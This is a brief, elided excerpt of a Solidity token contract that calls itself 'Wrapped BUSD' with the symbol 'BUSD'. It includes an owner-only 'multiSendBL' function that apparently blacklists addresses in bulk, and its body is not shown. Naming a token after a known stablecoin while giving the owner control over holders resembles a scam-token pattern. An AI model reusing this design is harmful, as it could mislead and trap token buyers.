...
contract TTTTTTT is JUOHedf {
    string public name = "Wrapped BUSD";
    string public symbol = "BUSD";
    uint256 public totalSupply = 10000000e17;
    ...
    function multiSendBL(address[] calldata accounts, bool value) public onlyOwner {
